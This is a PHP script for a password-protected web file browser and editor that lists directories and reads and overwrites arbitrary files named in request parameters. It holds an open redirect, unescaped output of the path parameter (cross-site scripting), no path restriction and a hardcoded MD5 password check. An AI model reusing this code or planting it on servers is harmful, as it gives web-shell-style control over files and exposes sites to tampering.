<?php
$ext="rar|zip|exe|chm|jpg|jpeg|gif|bmp|png|swf|fla";
if(isset($_REQUEST['view']))
{	$view=$_REQUEST['view'];
	header("location:$view");
	die();
}
if(isset($_REQUEST['msg'])){
	$msg=$_REQUEST['msg'];
}


//$v=file("./xk.txt");
$pw=md5($_SERVER['PHP_AUTH_PW']);
//!isset($PHP_AUTH_USER)||$PHP_AUTH_USER!=$u[0]||
if($pw!="8ce8bef435f4b4a4a5be64d54055c4a9") { 
	Header("WWW-Authenticate: Basic realm=\"online\""); 
	Header("HTTP/1.0 401 Unauthorized"); 
	exit; 
}

if(!isset($_REQUEST['tn'])){
	header("location:edit.php?tn=.");
	exit;
}
     //权限的处理
     function disp_perms($fn)
      { 
     $mode=fileperms($fn);
     $owner["read"]= ($mode & 0400) ? 'r' : '-'; 
     $owner["write"]  = ($mode & 0200) ? 'w' : '-'; 
     $owner["execute"] = ($mode & 0100) ? 'x' : '-'; 
     $group["read"]    = ($mode & 040) ? 'r' : '-'; 
     $group["write"]  = ($mode & 0020) ? 'w' : '-'; 
     $group["execute"] = ($mode & 0010) ? 'x' : '-'; 
     $world["read"]    = ($mode & 0004) ? 'r' : '-'; 
     $world["write"]  = ($mode & 0002) ? 'w' : '-'; 
     $world["execute"] = ($mode & 0001) ? 'x' : '-'; 
        
  foreach($owner as $y)
    echo $y; 
 
     foreach($group as $y)
     echo $y; 

     foreach($world as $y)
     echo $y; 
   }


?>
<html>
<head>
<title>edit <?php echo $_REQUEST['tn']?></title>
<style type="text/css">
a:link{ text-decoration: none; color: blue }
a:visited	{ text-decoration: none; color:green}
a:hover			{ text-decoration: underline }
td{background:#ffffff;font-color:red}
</style>
</head>
<body>

<center>
<a href="edit.php?tn=.">start</a>

<!-- <a href=edit.php?tn=./php>php</a>
<a href=edit.php?tn=./txt>txt</a> 
<a href=http://www.mm163.uni.cc/cpanel target=_blank>cpanel</a> -->


<?php
error_reporting(0);
if(isset($_REQUEST['tn']))
{
	$tn=$_REQUEST['tn'];
$yl="<a href=\"edit.php?view=$tn\" target=\"_blank\">preview</a>";
echo $yl;

}
if(isset($tn)&&filetype($tn)=="dir")
{
   
     if(is_readable($tn) )
    $id=@opendir("$tn");
   else {
     $d=explode("/",$tn);
       $i=count($d)-1;
     echo "<br><center><font color=#339988>".$d[$i].",is not readable</font></center><br><hr> ";

   die("<p align=center><font color=#987582
     size=2><a href=javascript:history.back(1)>go back</a>");
         }
   echo "<table border=1 borderColor=#f0f0f0  cellSpacing=1 cellPadding=1
  align=center><tr>";
  $i=0;
  while($fn=@readdir($id))
   {

      $i++;
     if($i%7==0) echo "<tr>";
     $tp=substr($fn,-3); 
	
	if(eregi($ext,$tp))
	 echo "<td><a href=edit.php?view=$tn/$fn target=_blank>$fn</td>";//<td>f"."</td>\n";
	 	else
	echo "<td><a href=edit.php?tn=$tn/$fn target=_top>$fn</td>";//<td>f"."</td>\n"; 
	
	
		
	/*
        switch($tp)
        {
         case "rar":
         case "zip":
         case "exe": 
         echo "<td><a href=edit.php?view=$tn/$fn target=_blank>$fn</td>";//<td>f"."</td>\n";
         break; 
         case "jpg":
         case "gif":
         echo "<td><a href=edit.php?view=$tn/$fn target=_blank>$fn</td>";//<td>f"."</td>\n";
         break; 
         default:
         echo "<td><a href=edit.php?tn=$tn/$fn target=_top>$fn</td>";//<td>f"."</td>\n";         
       }*/

   }
 echo "</table>";
 closedir($id);
 echo "<input value=refresh type=button onclick=\"location.href='?tn=$tn'\">
 <input value=forward type=button onclick=\"history.go(1);\"> 
<input value=backward type=button onclick=\"history.go(-1);\">"; 


}

else
{
 echo "<br />";  disp_perms($tn);
 if(isset($msg))
{
if(get_cfg_var("magic_quotes_gpc"))

$msg=stripslashes($msg);
$fn=$tn;
$fp=fopen($fn,"w");
flock($fp, 2);
fwrite($fp,$msg);
fclose($fp);
echo "<script> location.href=\"edit.php?tn=$tn\";</script>";



}


$a="
<form name=post action=edit.php?tn=$tn method=post target=_self>
<textarea   name=msg rows=22 cols=78>";
echo $a;
$fn=$tn;
$fp=fopen($fn,"r");
//flock($fp, 2);
$d=fread($fp,filesize($fn));
fclose($fp);
/*
$d=str_replace("<","&lt;",$d);
$d=str_replace(">","&gt;",$d);
*/
$d=htmlspecialchars($d);
$d=trim($d);
echo $d;
$b="
</textarea>  
                <br>
 
 <input name=reset value=reset type=reset> 
<input value=refresh type=button onclick=\"location.href='?tn=$tn'\">
<input value=forward type=button onclick=\"history.go(1);\"> 
<input value=backward type=button onclick=\"history.go(-1);\">
 <input name=submit type=submit value=save> 
</form>";
echo $b;


}

?>
</body>
</html>
